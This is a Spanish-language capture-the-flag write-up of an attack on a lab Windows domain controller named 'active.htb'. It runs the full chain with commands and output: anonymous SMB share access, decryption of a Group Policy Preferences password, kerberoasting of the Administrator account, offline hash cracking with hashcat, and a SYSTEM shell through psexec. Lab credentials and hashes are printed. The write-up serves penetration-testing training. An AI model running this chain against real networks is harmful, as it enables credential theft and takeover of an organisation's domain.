# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.234.109
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49162
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-08 16:55:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-08T16:56:42
|_  start_date: 2025-04-08T16:53:42
|_clock-skew: 1s

```

>Enumeramos la versión de Windows y el nombre del dominio mediante la herramienta crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.234.109                                                 
SMB         10.129.234.109  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

```

>Agregamos el dominio encontrado al /etc/hosts para que el equipo pueda resolver el nombre de dominio empleando el resolutor local:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo '10.129.234.109 active.htb' >> /etc/hosts

```

>No se puede loguear de forma anónima en el RPC y realizar llamadas:

```bash
┌──(kali㉿jbkira)-[~]
└─$ rpcclient -U "" -N 10.129.234.109
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> exit

```

>Vemos que logueandonos de forma anónima mediante SMB hay recursos compartidos disponibles, en concreto tenemos permisos de lectura en uno:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.234.109 -u '' -p '' --shares
SMB         10.129.234.109  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.234.109  445    DC               [+] active.htb\: 
SMB         10.129.234.109  445    DC               [+] Enumerated shares
SMB         10.129.234.109  445    DC               Share           Permissions     Remark
SMB         10.129.234.109  445    DC               -----           -----------     ------
SMB         10.129.234.109  445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.109  445    DC               C$                              Default share
SMB         10.129.234.109  445    DC               IPC$                            Remote IPC
SMB         10.129.234.109  445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.109  445    DC               Replication     READ            
SMB         10.129.234.109  445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.109  445    DC               Users                           

```

>En esta share podemos ver un archivo Groups.xml que parece interesante, así que nos lo llevamos:

```bash
┌──(kali㉿jbkira)-[~]
└─$ smbclient \\\\10.129.234.109\\Replication -U "" -N
Try "help" to get a list of possible commands.
smb: \> cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

                5217023 blocks of size 4096. 284319 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd MACHINE\Preferences\Groups\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

                5217023 blocks of size 4096. 284319 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

```

>En este archivo podemos ver lo que parece una contraseña para el usuario SVC_TGS:

```bash
┌──(kali㉿jbkira)-[~]
└─$ cat Groups.xml                                     
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

>Esta contraseña está encriptada con GPP por lo que podremos facilmente desencriptarla con el siguiente comando:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

>Comprobando las credenciales con crackmapexec vemos que son válidas:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.234.109 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.129.234.109  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.234.109  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

>Si tratamos de hacer un kerberoast veremos que la cuenta Administrator es kerberoasteable:

```bash
┌──(kali㉿jbkira)-[~]
└─$ impacket-GetUserSPNs -dc-ip 10.129.234.109 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-04-08 12:54:38.921338             

```

>Por lo que vamos a pedir el ticket TGS:

```bash
┌──(kali㉿jbkira)-[~]
└─$ impacket-GetUserSPNs -dc-ip 10.129.234.109 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-04-08 12:54:38.921338             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d26a0548c4f9595c0417812e6c392d6a$b250a05ae1de24e46780f39025c7995d6c9c54f0d5aadd63709065030c52c2001fa4a5d8e981ceed194674bb02d9ffea5ad1e43bee99b7e3b5db6d922ff033a2064951080457d077db55726dda8f8ceb314389d1f3232415925437775371109066268a7c17a0695791b395e5e8e4c1408a9d377e870cd5e27a56fe0258c82280357a54edf88a3afaafbc7e0725173753fc1ac9225dd67b537776489236dfb3954b0a75887a1f3edff406591499cafa014a72caac0e3b914d588db6eb34f866a5d1877bdc682d56bc5b3ff6e233281317fdd6b6dab996ac3d15a218fc6077af6d70b81d9252eee17e619f01078f810653cbeebf6d5d6a286915979bccad2a1ccc237e98df9b8635f4d3133d8da9d3b6e49c3939345c151ab0c884d2430b272fafd13e3fd36a7f5d8ed5a7e618fbaa1b588d9fb59e8f67328cd234bf8e10eda82c67a6f750d7a5e81312eedf8058d2052cc975b9d7ad72405b5083690d27ce6d2d0e90a91b65f25c411928b26ba4ad19dbd8963f76a40688e4b5d17ffc006f0c7e48bd4f45b36b06506ecd0ca22e4a96dffa26ff1f73ceef34d1ed85ae03bd4a2d87bfb08a6c469dbb08f87ba1d320f344d664a2dc841c6a8b0c1c7eda480db60b1f1876899c211d67d5fa257e8a2de4163865bb8a72b719b92c1165c4f1991bb92497fc28e464b3074e35987af4f262108264171547841bf7f33d33ddefa557061fbb7c758319bd68721b49c32f66350e4b45244eea26e03e58916b18bdcf505b43d6353a8e1779318d184c1caa62d3a0f51278f4d87497e3c878e3c66123f1d087bfb9a3ef7e35cbddfa628d2b2773b71611e4b19cf17666aee71d77f513ccec22451ce7e8d95893b540cf3d7c92fc0ff95415d52f123ee457b23a9f4632a9fb93b2f152f1e73265b4723c1f4edba0b1938d742a36fc3017e22d3716c00e587994929f53041435441015fe4ed6eac4de6a39164d01801e09d1b2600f6427cbbe9aec042d7f832bb4f32f5220efb1c1378ee6bb3f663fce8a489398b086dc8a6ec92076408aa6869374c1884837cb9be23588c04a6a0e07b1111b3364adcf4e86a991c57245426148aa089fd55a7fab5eb1c2024e71b81cd2278584fc995592976891a4011c91af054f567ad6e7ca65d5fc4c32a7632e98fe24dcd14ee989bb6136e8df7bd2201dd4189c2ae2a15c2a99ca845eedf1f7a29748321954c9c66157848ff7bf29333137feb75e414aa25516b1be1b2fa1d9380fc344
```

>Vamos a meterlo en un archivo y tratar de crackearlo offline con hashcat empleando la máscara 13100 que corresponde a los hashes KRB5TGS de tipo 23 (`$krb5tgs$23$`):

```bash
┌──(kali㉿jbkira)-[~]
└─$ hashcat -m 13100 admin_tgs /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d26a0548c4f9595c0417812e6c392d6a$b250a05ae1de24e46780f39025c7995d6c9c54f0d5aadd63709065030c52c2001fa4a5d8e981ceed194674bb02d9ffea5ad1e43bee99b7e3b5db6d922ff033a2064951080457d077db55726dda8f8ceb314389d1f3232415925437775371109066268a7c17a0695791b395e5e8e4c1408a9d377e870cd5e27a56fe0258c82280357a54edf88a3afaafbc7e0725173753fc1ac9225dd67b537776489236dfb3954b0a75887a1f3edff406591499cafa014a72caac0e3b914d588db6eb34f866a5d1877bdc682d56bc5b3ff6e233281317fdd6b6dab996ac3d15a218fc6077af6d70b81d9252eee17e619f01078f810653cbeebf6d5d6a286915979bccad2a1ccc237e98df9b8635f4d3133d8da9d3b6e49c3939345c151ab0c884d2430b272fafd13e3fd36a7f5d8ed5a7e618fbaa1b588d9fb59e8f67328cd234bf8e10eda82c67a6f750d7a5e81312eedf8058d2052cc975b9d7ad72405b5083690d27ce6d2d0e90a91b65f25c411928b26ba4ad19dbd8963f76a40688e4b5d17ffc006f0c7e48bd4f45b36b06506ecd0ca22e4a96dffa26ff1f73ceef34d1ed85ae03bd4a2d87bfb08a6c469dbb08f87ba1d320f344d664a2dc841c6a8b0c1c7eda480db60b1f1876899c211d67d5fa257e8a2de4163865bb8a72b719b92c1165c4f1991bb92497fc28e464b3074e35987af4f262108264171547841bf7f33d33ddefa557061fbb7c758319bd68721b49c32f66350e4b45244eea26e03e58916b18bdcf505b43d6353a8e1779318d184c1caa62d3a0f51278f4d87497e3c878e3c66123f1d087bfb9a3ef7e35cbddfa628d2b2773b71611e4b19cf17666aee71d77f513ccec22451ce7e8d95893b540cf3d7c92fc0ff95415d52f123ee457b23a9f4632a9fb93b2f152f1e73265b4723c1f4edba0b1938d742a36fc3017e22d3716c00e587994929f53041435441015fe4ed6eac4de6a39164d01801e09d1b2600f6427cbbe9aec042d7f832bb4f32f5220efb1c1378ee6bb3f663fce8a489398b086dc8a6ec92076408aa6869374c1884837cb9be23588c04a6a0e07b1111b3364adcf4e86a991c57245426148aa089fd55a7fab5eb1c2024e71b81cd2278584fc995592976891a4011c91af054f567ad6e7ca65d5fc4c32a7632e98fe24dcd14ee989bb6136e8df7bd2201dd4189c2ae2a15c2a99ca845eedf1f7a29748321954c9c66157848ff7bf29333137feb75e414aa25516b1be1b2fa1d9380fc344:Ticketmaster1968

```

>Vamos a probar las credenciales que acabamos de encontrar:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.234.109 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.129.234.109  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.234.109  445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

>Vamos a ganar una shell como SYSTEM mediante psexec de la suite de Impacket empleando las credenciales encontradas:

```bash
┌──(kali㉿jbkira)-[~]
└─$ impacket-psexec administrator@10.129.234.109                                                     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.129.234.109.....
[*] Found writable share ADMIN$
[*] Uploading file HkmzrFtV.exe
[*] Opening SVCManager on 10.129.234.109.....
[*] Creating service cQKn on 10.129.234.109.....
[*] Starting service cQKn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

>En los siguientes directorios podemos ver las flags:

```bash
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

<SNIP>

08/04/2025  07:54 ��                34 root.txt

               1 File(s)             34 bytes
               2 Dir(s)   1.138.126.848 bytes free
```

```bash
C:\Users\SVC_TGS\Desktop>
dir 
C:\Users\SVC_TGS\Desktop> Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\SVC_TGS\Desktop

<SNIP>

08/04/2025  07:54 ��                34 user.txt

               1 File(s)             34 bytes
               2 Dir(s)   1.143.562.240 bytes free

```
